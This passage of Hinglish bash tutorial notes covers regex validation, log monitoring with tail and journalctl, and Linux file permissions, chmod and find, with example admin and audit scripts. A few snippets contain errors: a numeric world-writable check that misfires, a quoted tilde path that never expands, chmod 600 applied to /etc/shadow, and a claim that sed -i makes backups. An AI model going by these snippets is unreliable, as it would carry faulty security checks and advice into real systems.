    if [ $length -lt 8 ]; then
        echo "✗ Too short (minimum 8 characters)"
        return 1
    elif [ $score -lt 3 ]; then
        echo "⚠️  Weak password"
        return 1
    elif [ $score -eq 3 ]; then
        echo "✓ Medium strength"
        return 0
    else
        echo "✓ Strong password"
        return 0
    fi
}

# Extract version numbers
extract_versions() {
    local file=$1
    
    # Match: v1.2.3 or 1.2.3
    grep -oE 'v?[0-9]+\.[0-9]+\.[0-9]+' "$file" | sort -V | uniq
}

main() {
    echo "=== Regex Validation Examples ==="
    
    validate_email "user@example.com"
    validate_email "invalid.email"
    
    echo ""
    
    validate_phone "(123) 456-7890"
    validate_phone "123-456-7890"
    validate_phone "invalid"
    
    echo ""
    
    check_password_strength "Weak123"
    check_password_strength "Strong@Pass123"
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Special chars escape nahi karna:** `.` ko `\.` karo
- ❌ **Greedy matching:** `.*` bahut zyada match karta hai
- ❌ **Character class galat:** `[a-Z]` galat, `[a-zA-Z]` sahi

### 10. **Best Practices / Pro Tips**
- 💡 **Test online:** regex101.com for testing
- 💡 **Start simple:** Pehle basic pattern, phir complex
- 💡 **Escape special chars:** `\.`, `\*`, `\+`
- 💡 **Use `-E` in grep:** Extended regex ke liye

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Security log analyzer with regex

readonly AUTH_LOG="/var/log/auth.log"

analyze_security() {
    echo "=== Security Analysis ==="
    
    # Failed SSH attempts
    echo "Failed SSH Attempts:"
    grep -E 'Failed password.*from [0-9.]+' "$AUTH_LOG" | \
        grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | \
        sort | uniq -c | sort -rn | head -10
    
    echo ""
    
    # Successful logins
    echo "Successful Logins:"
    grep -E 'Accepted (password|publickey)' "$AUTH_LOG" | \
        grep -oE 'for [a-z]+ from' | \
        cut -d ' ' -f 2 | \
        sort | uniq -c
    
    echo ""
    
    # Invalid users
    echo "Invalid User Attempts:"
    grep -E 'Invalid user' "$AUTH_LOG" | \
        grep -oE 'Invalid user [a-z0-9]+' | \
        cut -d ' ' -f 3 | \
        sort | uniq -c | sort -rn | head -10
}

analyze_security
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `^` start, `$` end
- ✅ `.` any char, `*` zero or more
- ✅ `+` one or more
- ✅ `[a-z]` character class
- ✅ `\.` escape special chars

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `.` aur `\.` mein kya fark hai?**
A: `.` any character, `\.` literal dot.

**Q2: `*` aur `+` mein kya fark hai?**
A: `*` zero or more, `+` one or more.

**Q3: Regex test kaise karu?**
A: regex101.com ya regexr.com use karo.

### 14. **Practice ke liye Task**

```bash
# 1. Start of line
grep '^Error' app.log

# 2. End of line
grep 'failed$' app.log

# 3. Email
grep -E '[a-z]+@[a-z]+\.[a-z]+' file.txt

# 4. IP address
grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' log.txt

# 5. Phone
grep -E '[0-9]{3}-[0-9]{3}-[0-9]{4}' contacts.txt

# 6. Validate
[[ "test@example.com" =~ ^[a-z]+@[a-z]+\.[a-z]+$ ]] && echo "Valid"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🎯 Regex for pattern matching
- 📍 `^` start, `$` end anchors
- 🔢 `+` one or more, `*` zero or more
- 🔤 `[a-z]` character classes
- 🛡️ Essential for validation

> **💡 Ye Zaroor Yaad Rakhein:**
> Regex powerful but complex! Start simple. `^` aur `$` anchors important. Special characters escape karo. regex101.com par practice karo. Validation aur extraction mein essential!

---

## **Topic 10: Log Monitoring (`tail -f`, `journalctl`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Log Monitoring** - Real-time log files monitor karna.

### 2. **Ye Kya Hai? (What is it?)**
`tail -f` file ke end ko continuously monitor karta hai aur new lines show karta hai. `journalctl` systemd logs ko query aur monitor karta hai. Real-time debugging aur monitoring ke liye essential.

**Analogy:** tail -f ek CCTV camera hai jo continuously file ko watch karta hai aur new activity show karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Real-time monitoring** - Live log viewing
- ✅ **Debugging** - Issues jaise hote hain dekho
- ✅ **System monitoring** - Service health check
- ✅ **Troubleshooting** - Problems identify karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Application debugging
- Service monitoring
- Deployment verification
- Security monitoring

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Delayed problem detection
- Manual log checking
- Missed critical events
- Slow troubleshooting

### 6. **Syntax aur Common Options**

```bash
# tail
tail -f file.log              # Follow file
tail -f -n 50 file.log        # Last 50 lines + follow
tail -F file.log              # Follow even if rotated

# journalctl
journalctl -f                 # Follow system logs
journalctl -u service.service # Specific service
journalctl -p err             # Priority: err, warning, info
journalctl --since "1 hour ago"
journalctl --until "10 min ago"
journalctl -n 100             # Last 100 lines
```

### 7. **Example 1 (Basic)**

```bash
# Follow log file
tail -f /var/log/syslog

# Last 20 lines + follow
tail -f -n 20 app.log

# Follow with rotation handling
tail -F /var/log/app.log

# Multiple files
tail -f file1.log file2.log

# Filter while following
tail -f app.log | grep ERROR

# journalctl examples
journalctl -f                          # Follow all logs
journalctl -u nginx.service -f         # Follow nginx
journalctl -p err -f                   # Follow errors only
journalctl --since "10 minutes ago"    # Recent logs
journalctl --since today               # Today's logs
journalctl -u ssh.service -n 50        # Last 50 SSH logs
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Advanced log monitoring system

set -euo pipefail

readonly LOG_FILE="/var/log/app.log"
readonly ALERT_EMAIL="admin@example.com"
readonly ERROR_THRESHOLD=10

# Monitor for errors
monitor_errors() {
    echo "=== Monitoring for Errors ==="
    
    tail -f "$LOG_FILE" | while read line; do
        if echo "$line" | grep -qi "error\|fatal\|critical"; then
            echo "[$(date)] ⚠️  $line"
            
            # Send alert if threshold exceeded
            local error_count=$(grep -c "ERROR" "$LOG_FILE" | tail -1)
            if [ "$error_count" -gt "$ERROR_THRESHOLD" ]; then
                echo "High error rate detected" | \
                    mail -s "Alert: High Error Rate" "$ALERT_EMAIL"
            fi
        fi
    done
}

# Monitor multiple logs
monitor_multiple() {
    tail -f /var/log/app.log /var/log/error.log | \
        while read line; do
            case "$line" in
                *ERROR*)
                    echo -e "\033[0;31m$line\033[0m"  # Red
                    ;;
                *WARN*)
                    echo -e "\033[0;33m$line\033[0m"  # Yellow
                    ;;
                *INFO*)
                    echo -e "\033[0;32m$line\033[0m"  # Green
                    ;;
                *)
                    echo "$line"
                    ;;
            esac
        done
}

# Monitor with filtering
monitor_filtered() {
    local service=$1
    
    echo "=== Monitoring $service ==="
    
    journalctl -u "$service" -f | \
        grep --line-buffered -E "error|failed|warning" | \
        while read line; do
            echo "[$(date '+%H:%M:%S')] $line"
            
            # Log to file
            echo "$line" >> "/tmp/${service}_alerts.log"
        done
}

# Monitor with statistics
monitor_with_stats() {
    local log=$1
    local interval=60
    
    while true; do
        local errors=$(grep -c "ERROR" "$log" || echo "0")
        local warnings=$(grep -c "WARN" "$log" || echo "0")
        
        echo "[$(date)] Errors: $errors, Warnings: $warnings"
        
        sleep $interval
    done
}

# Monitor and trigger actions
monitor_and_act() {
    tail -f "$LOG_FILE" | while read line; do
        # Check for specific patterns
        if echo "$line" | grep -q "OutOfMemory"; then
            echo "⚠️  Out of Memory detected!"
            # Restart service
            systemctl restart myapp.service
            echo "Service restarted" | mail -s "OOM - Service Restarted" "$ALERT_EMAIL"
            
        elif echo "$line" | grep -q "Database connection failed"; then
            echo "⚠️  Database connection issue!"
            # Check database
            if ! pg_isready -h localhost; then
                echo "Database is down!" | mail -s "Database Down" "$ALERT_EMAIL"
            fi
            
        elif echo "$line" | grep -q "Disk space low"; then
            echo "⚠️  Disk space warning!"
            df -h | mail -s "Disk Space Alert" "$ALERT_EMAIL"
        fi
    done
}

# Monitor with rate limiting
monitor_rate_limited() {
    local last_alert=0
    local alert_interval=300  # 5 minutes
    
    tail -f "$LOG_FILE" | grep --line-buffered "ERROR" | while read line; do
        local now=$(date +%s)
        
        if [ $((now - last_alert)) -gt $alert_interval ]; then
            echo "Alert: $line"
            # Send notification
            last_alert=$now
        fi
    done
}

# Monitor systemd service
monitor_service() {
    local service=$1
    
    echo "=== Monitoring $service ==="
    
    journalctl -u "$service" -f -n 0 | while read line; do
        # Parse and colorize
        if echo "$line" | grep -q "Started"; then
            echo -e "\033[0;32m✓ $line\033[0m"
        elif echo "$line" | grep -q "Stopped\|Failed"; then
            echo -e "\033[0;31m✗ $line\033[0m"
        else
            echo "$line"
        fi
    done
}

# Monitor with pattern matching
monitor_patterns() {
    local patterns=(
        "ERROR"
        "FATAL"
        "Exception"
        "failed"
        "timeout"
    )
    
    tail -f "$LOG_FILE" | while read line; do
        for pattern in "${patterns[@]}"; do
            if echo "$line" | grep -qi "$pattern"; then
                echo "[$(date)] Matched '$pattern': $line"
                break
            fi
        done
    done
}

# Monitor and extract metrics
monitor_metrics() {
    journalctl -u myapp.service -f | \
        grep --line-buffered "response_time" | \
        while read line; do
            # Extract response time
            local time=$(echo "$line" | grep -oE '[0-9]+ms')
            echo "[$(date '+%H:%M:%S')] Response time: $time"
            
            # Alert if slow
            local ms=$(echo "$time" | grep -oE '[0-9]+')
            if [ "$ms" -gt 1000 ]; then
                echo "⚠️  Slow response detected: ${ms}ms"
            fi
        done
}

# Main menu
main() {
    local action=${1:-basic}
    
    case $action in
        errors)
            monitor_errors
            ;;
        service)
            monitor_service "${2:-nginx.service}"
            ;;
        filtered)
            monitor_filtered "${2:-sshd.service}"
            ;;
        stats)
            monitor_with_stats "$LOG_FILE"
            ;;
        *)
            echo "Usage: $0 {errors|service|filtered|stats} [service-name]"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`tail -f` vs `tail -F`:** `-F` log rotation handle karta hai
- ❌ **Buffering issues:** `grep --line-buffered` use karo
- ❌ **Resource usage:** Long-running tail processes monitor karo

### 10. **Best Practices / Pro Tips**
- 💡 **`tail -F`:** Log rotation ke liye better
- 💡 **`--line-buffered`:** Grep ke saath use karo
- 💡 **Color coding:** Important messages highlight karo
- 💡 **Rate limiting:** Alert spam avoid karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Production monitoring dashboard

monitor_production() {
    echo "=== Production Monitoring Dashboard ==="
    
    # Monitor application logs
    (
        echo "=== Application Logs ==="
        tail -f /var/log/app/application.log | \
            grep --line-buffered -E "ERROR|FATAL" | \
            while read line; do
                echo "[APP] $line"
            done
    ) &
    
    # Monitor nginx access
    (
        echo "=== Nginx Access ==="
        tail -f /var/log/nginx/access.log | \
            grep --line-buffered " 5[0-9][0-9] " | \
            while read line; do
                echo "[NGINX] 5xx Error: $line"
            done
    ) &
    
    # Monitor system logs
    (
        echo "=== System Logs ==="
        journalctl -f -p err | \
            while read line; do
                echo "[SYSTEM] $line"
            done
    ) &
    
    # Wait for all background jobs
    wait
}

monitor_production
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `tail -f` follow logs
- ✅ `tail -F` handle rotation
- ✅ `journalctl -f` systemd logs
- ✅ `grep --line-buffered` for piping
- ✅ Combine with filters

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `tail -f` vs `tail -F` kya fark hai?**
A: `-F` log rotation handle karta hai, `-f` nahi.

**Q2: journalctl logs kahan store hote hain?**
A: `/var/log/journal/` mein binary format mein.

**Q3: Real-time filtering kaise karu?**
A: `tail -f log | grep --line-buffered pattern`

### 14. **Practice ke liye Task**

```bash
# 1. Basic follow
tail -f /var/log/syslog

# 2. Last 50 + follow
tail -f -n 50 app.log

# 3. With filter
tail -f app.log | grep ERROR

# 4. journalctl
journalctl -f

# 5. Specific service
journalctl -u nginx.service -f

# 6. Recent errors
journalctl -p err --since "10 minutes ago"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📺 `tail -f` for real-time logs
- 🔄 `tail -F` handles rotation
- 📋 `journalctl` for systemd
- 🎯 Combine with grep/awk
- 🚨 Essential for monitoring

> **💡 Ye Zaroor Yaad Rakhein:**
> tail -f production monitoring ka backbone! `-F` log rotation ke liye. journalctl systemd services ke liye. grep --line-buffered piping ke liye. Color coding readability improve karta hai!

---

# **🎉 Module 13 Complete! 🎉**

Congratulations! Aapne **Module 13: Powerful Text Processing** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ **grep** - Basic & Advanced searching
✅ **cut** - Column extraction
✅ **sort, uniq, wc, tr** - Text utilities
✅ **diff & comm** - File comparison
✅ **sed** - Stream editing
✅ **awk** - Pattern scanning
✅ **jq** - JSON processing
✅ **Regex** - Pattern matching
✅ **Log Monitoring** - Real-time tracking

## **Key Commands Summary:**

```bash
# grep - Search
grep -i "pattern" file.txt
grep -r -E "pattern1|pattern2" /path/

# cut - Extract columns
cut -d ',' -f 1,3 file.csv

# sort & uniq - Organize
sort file.txt | uniq -c | sort -rn

# sed - Replace
sed -i 's/old/new/g' file.txt

# awk - Process columns
awk -F ',' '{print $1, $3}' file.csv
awk '{sum += $1} END {print sum}'

# jq - JSON
jq '.field' file.json
jq '.[] | select(.age > 25)'

# tail - Monitor
tail -f /var/log/app.log
journalctl -u service -f
```

## **Text Processing Pipeline:**

```bash
# Complete example
cat access.log | \
    grep "ERROR" | \
    cut -d ' ' -f 1 | \
    sort | \
    uniq -c | \
    sort -rn | \
    head -10
```

## **Best Practices:**
- ✅ Combine tools with pipes
- ✅ Test patterns before applying
- ✅ Use `-i` for backups with sed
- ✅ `grep --line-buffered` for real-time
- ✅ Learn regex basics
- ✅ jq for all JSON operations

## **Common Patterns:**

```bash
# Find and count
grep "pattern" file | wc -l

# Extract and deduplicate
cut -d ',' -f 1 file.csv | sort | uniq

# Replace in multiple files
find . -name "*.txt" -exec sed -i 's/old/new/g' {} \;

# Monitor with filter
tail -f app.log | grep --line-buffered "ERROR"

# JSON extraction
curl -s api.com/data | jq -r '.items[].name'
```

## **Next Steps:**
Aap ab ready hain **Module 14: System Administration & Automation** ke liye! Aage seekhenge file permissions, process management, cron jobs, aur system automation!

---

**💡 Remember:** Text processing Linux ka superpower hai! grep, sed, awk master karo. Pipes powerful hain. Practice daily. Real logs par experiment karo! 🚀

---



=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 14)**

---

## **PART 4: ADVANCED TOOLS & REAL-WORLD AUTOMATION**

---

# **Module 14: System Administration & Automation**

---

## **Topic 1: File Permissions (`ls -l`, Owner, Group, `rwx`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**File Permissions** - Files aur directories ki access control.

### 2. **Ye Kya Hai? (What is it?)**
Linux mein har file/directory ke permissions hote hain jo define karte hain ki kaun read (r), write (w), ya execute (x) kar sakta hai. Owner, group, aur others ke liye alag permissions. `ls -l` se dekh sakte hain.

**Analogy:** Permissions ek building ka security system hai - kuch logon ko entry hai, kuch ko nahi, kuch sirf dekh sakte hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Security** - Unauthorized access prevent
- ✅ **Privacy** - Data protection
- ✅ **System stability** - Critical files protect
- ✅ **Multi-user** - Shared systems manage

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- File security setup
- Script execution enable
- Shared directories manage
- System administration

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Security breaches
- Unauthorized modifications
- Data loss
- System compromise

### 6. **Syntax aur Common Options**

```bash
# View permissions
ls -l file.txt
# Output: -rw-r--r-- 1 user group 1234 Jan 15 10:30 file.txt
#         │││││││││
#         │││││││└└ others: r--
#         ││││││└└└ group: r--
#         │││└└└└└└ owner: rw-
#         ││└────── number of links
#         │└─────── file type (- = file, d = directory)

# Permission format
r = read (4)
w = write (2)
x = execute (1)

# Examples
-rw-r--r--  # 644: owner rw, group r, others r
-rwxr-xr-x  # 755: owner rwx, group rx, others rx
drwxrwxrwx  # 777: all permissions (dangerous!)
```

### 7. **Example 1 (Basic)**

```bash
# View permissions
ls -l file.txt
# -rw-r--r-- 1 john users 1234 Jan 15 10:30 file.txt

# Breakdown:
# - = regular file (d = directory, l = link)
# rw- = owner can read, write
# r-- = group can read only
# r-- = others can read only
# john = owner
# users = group

# Directory permissions
ls -ld /home/john
# drwxr-xr-x 5 john users 4096 Jan 15 10:30 /home/john

# View all files with permissions
ls -la

# View only directories
ls -ld */
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Permission audit script

set -euo pipefail

# Check file permissions
check_permissions() {
    local file=$1
    
    if [ ! -e "$file" ]; then
        echo "✗ File not found: $file"
        return 1
    fi
    
    local perms=$(stat -c %a "$file" 2>/dev/null || stat -f %A "$file")
    local owner=$(stat -c %U "$file" 2>/dev/null || stat -f %Su "$file")
    local group=$(stat -c %G "$file" 2>/dev/null || stat -f %Sg "$file")
    
    echo "File: $file"
    echo "  Permissions: $perms"
    echo "  Owner: $owner"
    echo "  Group: $group"
    
    # Check if world-writable
    if [ "$perms" -ge 666 ]; then
        echo "  ⚠️  WARNING: World-writable!"
    fi
}

# Find insecure files
find_insecure_files() {
    local dir=${1:-.}
    
    echo "=== Finding Insecure Files ==="
    
    # World-writable files
    echo "World-writable files:"
    find "$dir" -type f -perm -002 -ls 2>/dev/null
    
    # SUID files
    echo ""
    echo "SUID files:"
    find "$dir" -type f -perm -4000 -ls 2>/dev/null
    
    # Files without owner
    echo ""
    echo "Files without owner:"
    find "$dir" -nouser -ls 2>/dev/null
}

# Audit directory
audit_directory() {
    local dir=$1
    
    echo "=== Auditing: $dir ==="
    
    find "$dir" -type f | while read file; do
        local perms=$(stat -c %a "$file" 2>/dev/null || stat -f %A "$file")
        
        if [ "$perms" -gt 644 ] && [ "$perms" -ne 755 ]; then
            echo "⚠️  Unusual permissions: $file ($perms)"
        fi
    done
}

main() {
    check_permissions "${1:-/etc/passwd}"
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **777 permissions:** Sabko sab access (dangerous!)
- ❌ **Owner vs group confuse:** Dono alag hain
- ❌ **Execute permission bhoolna:** Scripts ke liye zaroori

### 10. **Best Practices / Pro Tips**
- 💡 **644 for files:** Default file permissions
- 💡 **755 for directories:** Standard directory permissions
- 💡 **Never 777:** Security risk
- 💡 **Check regularly:** Audit permissions

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Security audit for web server

audit_web_server() {
    echo "=== Web Server Security Audit ==="
    
    # Check web root permissions
    local web_root="/var/www/html"
    
    echo "Checking $web_root..."
    
    # Files should be 644
    find "$web_root" -type f ! -perm 644 -ls
    
    # Directories should be 755
    find "$web_root" -type d ! -perm 755 -ls
    
    # Check ownership
    find "$web_root" ! -user www-data -ls
    
    echo "✓ Audit complete"
}

audit_web_server
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `ls -l` view permissions
- ✅ `rwx` = read, write, execute
- ✅ Owner, group, others
- ✅ 644 files, 755 directories
- ✅ Never use 777

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: 644 ka matlab kya hai?**
A: Owner: rw (6), Group: r (4), Others: r (4)

**Q2: Execute permission kab chahiye?**
A: Scripts aur programs ke liye.

**Q3: Directory ke liye x permission kyun?**
A: Directory mein enter karne ke liye.

### 14. **Practice ke liye Task**

```bash
# 1. View permissions
ls -l file.txt

# 2. View directory
ls -ld /home/user

# 3. Check all files
ls -la

# 4. Find world-writable
find . -perm -002

# 5. Check specific file
stat file.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔐 Permissions control access
- 📝 `rwx` = read, write, execute
- 👤 Owner, group, others
- 📊 `ls -l` to view
- ⚠️ 777 dangerous!

> **💡 Ye Zaroor Yaad Rakhein:**
> Permissions security ka foundation! 644 files ke liye, 755 directories ke liye. 777 kabhi use mat karo. `ls -l` se check karo. Owner aur group important!

---

## **Topic 2: `chmod` (Symbolic `+x` & Octal `755`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**chmod** - File permissions change karne ka command.

### 2. **Ye Kya Hai? (What is it?)**
`chmod` (change mode) file permissions modify karta hai. Do methods: symbolic (`+x`, `-w`) aur octal (755, 644). Symbolic human-readable, octal precise aur fast.

**Analogy:** chmod ek key maker hai jo locks change karta hai - kaun andar aa sakta hai control karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Security management** - Access control
- ✅ **Script execution** - Executable banana
- ✅ **File protection** - Write protect
- ✅ **System administration** - Permission management

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Script executable banana
- File permissions fix karna
- Security setup
- Shared files manage

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Scripts run nahi hongi
- Security issues
- Access problems
- Permission errors

### 6. **Syntax aur Common Options**

```bash
# Symbolic mode
chmod +x file.sh        # Add execute
chmod -w file.txt       # Remove write
chmod u+x file.sh       # User add execute
chmod g-w file.txt      # Group remove write
chmod o+r file.txt      # Others add read
chmod a+x file.sh       # All add execute

# Octal mode
chmod 644 file.txt      # rw-r--r--
chmod 755 script.sh     # rwxr-xr-x
chmod 600 secret.txt    # rw-------
chmod 777 file.txt      # rwxrwxrwx (avoid!)

# Recursive
chmod -R 755 directory/

# Reference file
chmod --reference=file1 file2
```

### 7. **Example 1 (Basic)**

```bash
# Make script executable
chmod +x script.sh
./script.sh

# Remove write permission
chmod -w important.txt

# Octal permissions
chmod 644 file.txt      # rw-r--r--
chmod 755 script.sh     # rwxr-xr-x
chmod 600 private.key   # rw-------

# User, group, others
chmod u+x file.sh       # User execute
chmod g+w file.txt      # Group write
chmod o-r file.txt      # Others no read

# Multiple changes
chmod u+x,g+x,o-r file.sh

# Recursive
chmod -R 755 /var/www/html/

# Verify
ls -l file.txt
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Permission management script

set -euo pipefail

# Set secure permissions
secure_file() {
    local file=$1
    
    # Owner read/write only
    chmod 600 "$file"
    echo "✓ Secured: $file (600)"
}

# Make executable
make_executable() {
    local script=$1
    
    if [ -f "$script" ]; then
        chmod +x "$script"
        echo "✓ Made executable: $script"
    else
        echo "✗ File not found: $script"
        return 1
    fi
}

# Set web permissions
set_web_permissions() {
    local web_root=$1
    
    echo "Setting web permissions for $web_root..."
    
    # Directories: 755
    find "$web_root" -type d -exec chmod 755 {} \;
    
    # Files: 644
    find "$web_root" -type f -exec chmod 644 {} \;
    
    # PHP files: 644
    find "$web_root" -name "*.php" -exec chmod 644 {} \;
    
    echo "✓ Web permissions set"
}

# Fix common permission issues
fix_permissions() {
    local dir=$1
    
    echo "Fixing permissions in $dir..."
    
    # Remove world-writable
    find "$dir" -type f -perm -002 -exec chmod o-w {} \;
    
    # Ensure owner can read
    find "$dir" -type f ! -perm -u+r -exec chmod u+r {} \;
    
    # Directories executable
    find "$dir" -type d ! -perm -u+x -exec chmod u+x {} \;
    
    echo "✓ Permissions fixed"
}

# Backup with permissions
backup_with_perms() {
    local source=$1
    local backup=$2
    
    # Copy with permissions
    cp -p "$source" "$backup"
    
    # Or use tar to preserve
    tar -cpzf "${backup}.tar.gz" "$source"
    
    echo "✓ Backup created with permissions preserved"
}

# Set script permissions
setup_scripts() {
    local script_dir=$1
    
    echo "Setting up scripts in $script_dir..."
    
    # All .sh files executable
    find "$script_dir" -name "*.sh" -exec chmod +x {} \;
    
    # Remove execute from non-scripts
    find "$script_dir" -type f ! -name "*.sh" -exec chmod -x {} \;
    
    echo "✓ Script permissions set"
}

# Secure sensitive files
secure_sensitive() {
    local files=(
        "/etc/ssh/sshd_config"
        "/etc/shadow"
        "~/.ssh/id_rsa"
    )
    
    for file in "${files[@]}"; do
        if [ -f "$file" ]; then
            chmod 600 "$file"
            echo "✓ Secured: $file"
        fi
    done
}

main() {
    local action=${1:-help}
    
    case $action in
        secure)
            secure_file "$2"
            ;;
        exec)
            make_executable "$2"
            ;;
        web)
            set_web_permissions "$2"
            ;;
        fix)
            fix_permissions "$2"
            ;;
        *)
            echo "Usage: $0 {secure|exec|web|fix} <path>"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Recursive without thinking:** `-R` carefully use karo
- ❌ **777 use karna:** Security risk
- ❌ **Symbolic vs octal confuse:** Dono alag methods

### 10. **Best Practices / Pro Tips**
- 💡 **644 for files:** Standard file permissions
- 💡 **755 for scripts:** Executable but safe
- 💡 **600 for secrets:** Private keys, passwords
- 💡 **Test first:** Ek file par pehle test karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# WordPress installation permissions

setup_wordpress() {
    local wp_dir="/var/www/wordpress"
    
    echo "=== Setting WordPress Permissions ==="
    
    # Directories: 755
    find "$wp_dir" -type d -exec chmod 755 {} \;
    
    # Files: 644
    find "$wp_dir" -type f -exec chmod 644 {} \;
    
    # wp-config.php: 600 (secure)
    chmod 600 "$wp_dir/wp-config.php"
    
    # .htaccess: 644
    chmod 644 "$wp_dir/.htaccess"
    
    # uploads directory: 755
    chmod 755 "$wp_dir/wp-content/uploads"
    
    # Set ownership
    chown -R www-data:www-data "$wp_dir"
    
    echo "✓ WordPress permissions configured"
}

setup_wordpress
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `chmod +x` make executable
- ✅ `chmod 644` standard file
- ✅ `chmod 755` executable/directory
- ✅ `chmod 600` private files
- ✅ `-R` for recursive

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Symbolic vs octal kab use karu?**
A: Symbolic quick changes ke liye, octal precise setup ke liye.

**Q2: 755 ka matlab kya hai?**
A: Owner: rwx (7), Group: rx (5), Others: rx (5)

**Q3: Recursive chmod safe hai?**
A: Carefully use karo, test pehle.

### 14. **Practice ke liye Task**

```bash
# 1. Make executable
chmod +x script.sh

# 2. Standard file
chmod 644 file.txt

# 3. Executable script
chmod 755 script.sh

# 4. Private file
chmod 600 secret.txt

# 5. Recursive
chmod -R 755 directory/

# 6. Remove write
chmod -w file.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔧 chmod changes permissions
- ➕ Symbolic: `+x`, `-w`
- 🔢 Octal: 644, 755, 600
- 🔁 `-R` for recursive
- 🎯 644 files, 755 scripts

> **💡 Ye Zaroor Yaad Rakhein:**
> chmod permission management ka tool! Symbolic quick changes ke liye, octal precise setup ke liye. 644 files, 755 scripts, 600 secrets. Recursive carefully use karo!

---

## **Topic 3: `find` (Advanced: `-name`, `-type`, `-size`, `-mtime`, `-perm`, `-exec`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**find** - Files aur directories search karne ka powerful tool.

### 2. **Ye Kya Hai? (What is it?)**
`find` command files ko search karta hai based on name, type, size, modification time, permissions, etc. `-exec` se found files par commands execute kar sakte hain. System administration ka essential tool.

**Analogy:** find ek search engine hai apne system ka - kisi bhi criteria se files dhoondhta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **File location** - Files quickly dhoondhna
- ✅ **Bulk operations** - Multiple files process
- ✅ **System cleanup** - Old files delete
- ✅ **Security audit** - Suspicious files find

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Files search karna
- Bulk operations
- System maintenance
- Security audits

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual searching (time waste)
- Missed files
- Inefficient cleanup
- Poor system management

### 6. **Syntax aur Common Options**

```bash
# By name
find /path -name "*.txt"
find /path -iname "*.TXT"      # Case-insensitive

# By type
find /path -type f             # Files
find /path -type d             # Directories
find /path -type l             # Symbolic links

# By size
find /path -size +100M         # Larger than 100MB
find /path -size -1M           # Smaller than 1MB
find /path -size 50M           # Exactly 50MB

# By time
find /path -mtime -7           # Modified in last 7 days
find /path -mtime +30          # Modified more than 30 days ago
find /path -atime -1           # Accessed in last 24 hours

# By permissions
find /path -perm 777           # Exactly 777
find /path -perm -002          # World-writable

# Execute command
find /path -name "*.log" -exec rm {} \;
find /path -type f -exec chmod 644 {} \;
```

### 7. **Example 1 (Basic)**

```bash
# Find by name
find /home -name "*.txt"
find . -name "config.json"

# Case-insensitive
find . -iname "*.PDF"

# Find directories
find /var -type d -name "log"

# Find files
find /tmp -type f -name "*.tmp"

# By size
find /var/log -size +100M
find . -size -1M -name "*.txt"

# By modification time
find /home -mtime -7           # Last 7 days
find /tmp -mtime +30           # Older than 30 days

# By permissions
find /var/www -perm 777
find . -perm -002              # World-writable

# Combine conditions
find . -name "*.log" -size +10M -mtime +7

# Execute command
find . -name "*.tmp" -exec rm {} \;
find . -type f -exec chmod 644 {} \;

# With confirmation
find . -name "*.bak" -ok rm {} \;
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Advanced file management with find

set -euo pipefail

# Clean old log files
clean_old_logs() {
    local log_dir=${1:-/var/log}
    local days=${2:-30}
    
    echo "=== Cleaning logs older than $days days ==="
    
    find "$log_dir" -name "*.log" -type f -mtime +$days -print -delete
    
    echo "✓ Old logs cleaned"
}

# Find large files
find_large_files() {
    local dir=${1:-.}
    local size=${2:-100M}
    
    echo "=== Files larger than $size ==="
    
    find "$dir" -type f -size +$size -exec ls -lh {} \; | \
        awk '{print $5, $9}' | sort -hr | head -20
}

# Find duplicate files
find_duplicates() {
    local dir=${1:-.}
    
    echo "=== Finding Duplicate Files ==="
    
    find "$dir" -type f -exec md5sum {} \; | \
        sort | \
        uniq -w32 -D
}
